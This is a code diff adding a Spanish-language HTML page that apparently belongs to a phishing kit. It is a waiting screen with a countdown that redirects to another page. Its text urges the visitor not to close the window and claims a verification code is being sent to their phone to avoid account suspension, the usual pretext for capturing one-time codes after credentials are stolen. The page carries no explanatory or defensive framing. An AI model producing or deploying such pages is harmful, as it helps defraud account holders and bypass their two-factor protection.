@@ -1,0 +1,68 @@
+
+<!DOCTYPE html>
+<html >
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>internet-Fall</title>
+
+    <link rel="stylesheet" href="foster/home.css">
+
+    <script type="text/javascript">
+    
+			   
+        var tiempo=15;
+          var url="sooons.html";
+       
+        function updateReloj()
+        {
+          document.getElementById('contador').innerHTML = " "+tiempo+" ";
+       
+          if(tiempo==0)
+          {
+            window.location=url;
+                                  
+          }else{
+            tiempo-=1;
+            setTimeout("updateReloj()",1000);
+          }
+        }
+         window.onload=updateReloj;
+        </script>
+    
+
+</head>
+<body>
+
+
+
+
+<div style="background-color: rgb(31, 145, 0);height: 10px; width: 100%;">  </div>
+
+<div style="background-color: rgb(148, 206, 10);height: 10px; width: 100%;">  </div>
+
+<center>
+
+    <form method="post" action="#" onsubmit="return sender();"> 
+
+    <div  class="sitefan">
+<img src="foster/monsterlog.png" alt="brokxj"><br><br>
+
+<h2>No cierres esta ventana!!</h2>
+<div style="text-align: center;font-size:18px;" align="center">
+Espera <font id="contador" style=" font-size:28px;"></font></strong> segundos. 
+<br>Para validar su información le estamos enviando <br>un código a su teléfono, Completa este ultimo paso y evita que tu cuenta sea suspendida </div>
+
+
+<br>
+
+    </form>
+</center>
+
+</div>
+
+</body>
+
+
+
+</html>
